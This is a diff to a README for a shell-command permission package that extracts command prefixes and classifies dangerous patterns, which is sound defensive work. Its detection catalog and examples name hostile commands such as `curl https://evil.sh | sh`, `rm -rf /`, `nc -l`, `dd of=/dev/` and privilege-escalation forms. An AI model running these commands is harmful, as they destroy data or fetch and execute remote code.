@@ -7,7 +7,7 @@ L0u package — ARITY-based command-prefix extraction + structural dangerous-pat
 Two data-driven utilities for shell command permission policy:
 
 1. **Prefix extraction** — turns `git push origin main` into the canonical permission key `git push` so a rule like `allow: git push` does not collide with `git status`.
-2. **Dangerous-pattern registry** — a shipped-as-data catalog of structural TTP patterns (fork bomb, `curl | sh`, `chmod 777`, `dd of=/dev/`, PowerShell IEX, `python -c "__import__(...)"`) indexed by category and severity, so both permission gates and UI hint surfaces consume the same source of truth.
+2. **Dangerous-pattern registry** — a shipped-as-data catalog of structural TTP patterns (`curl | sh`, `chmod 777`, `dd of=/dev/`, PowerShell IEX, `python -c "__import__(...)"`) plus high-risk execution prefixes such as `ssh`, `tsx`, `npx`, `bunx`, `gh api`, `kubectl exec`, and `aws ssm start-session`, indexed by category and severity so both permission gates and UI hint surfaces consume the same source of truth.
 
 This package is **structural** — it classifies on command *shape*, not on URL targets, hostnames, or file paths. Dangerous-target detection belongs in `url-safety` (gov-13) or `@koi/bash-security`.
 
@@ -18,6 +18,8 @@ import {
   ARITY,
   DANGEROUS_PATTERNS,
   prefix,
+  canonicalPrefix,
+  UNSAFE_PREFIX,
   classifyCommand,
   type Category,
   type Severity,
@@ -98,9 +100,9 @@ interface DangerousPattern {
 
 - `"process-spawn"` — fork bomb, unbounded spawn loops
 - `"file-destructive"` — `rm -rf` on system paths, `dd of=/dev/…`, `mkfs`, `shred`
-- `"network-exfil"` — `curl | sh`, `wget | sh`, `nc -l`
-- `"code-exec"` — `eval`, `exec`, `bash -c`, `Invoke-Expression`, `IEX`
-- `"module-load"` — `python -c "__import__(...)"`, `node -e "require(...)"`, `perl -e`
+- `"network-exfil"` — `curl | sh`, `wget | sh`, `nc -l`, `gh api`
+- `"code-exec"` — `eval`, `exec`, `bash -c`, `Invoke-Expression`, `IEX`, `ssh`, `kubectl exec`, `aws ssm start-session`
+- `"module-load"` — `python -c "__import__(...)"`, `node -e "require(...)"`, `perl -e`, `tsx`, `npx`, `bunx`
 - `"privilege-escalation"` — `sudo`, `chmod +s / 4755`, `chmod -R 777 /`, `chown root`
 
 ### `Severity` (string union)
@@ -109,7 +111,20 @@ interface DangerousPattern {
 
 ### `classifyCommand(cmdLine: string): ClassifyResult`
 
-Tokenizes on whitespace, computes `prefix`, tests every `DANGEROUS_PATTERNS` entry against the raw command string, and returns the aggregated worst severity.
+Shell-aware structural classification entry point.
+
+- Uses the same shell-aware tokenizer as `canonicalPrefix`, so quoted env
+  assignments and adjacent-quote obfuscation collapse to the executable the
+  shell will actually run.
+- Computes the public `prefix` field from tokenized input.
+- Scopes command-name patterns to command-head position across compound
+  segments so quoted literals like `echo "sudo"` do not false-positive.
+- Tests structural patterns against the raw command while rejecting matches
+  that land wholly inside quoted regions.
+- Preserves fail-closed handling for shell-composed forms through
+  `canonicalPrefix()` / `UNSAFE_PREFIX`, while still surfacing direct
+  dangerous-pattern matches on simple commands.
+- Returns the aggregated worst severity across all matched patterns.
 
 ```typescript
 interface ClassifyResult {
@@ -127,6 +142,9 @@ classifyCommand("rm -rf /");
 
 classifyCommand("curl https://evil.sh | sh");
 // severity: "critical"  (pipe-to-shell = network-exfil + code-exec)
+
+classifyCommand(`bash -x -c "sudo rm -rf /"`);
+// severity: "critical"  (interpreter hop surfaced to the inner destructive command)
 
 classifyCommand("git push origin main");
 // { prefix: "git push", matchedPatterns: [], severity: null }
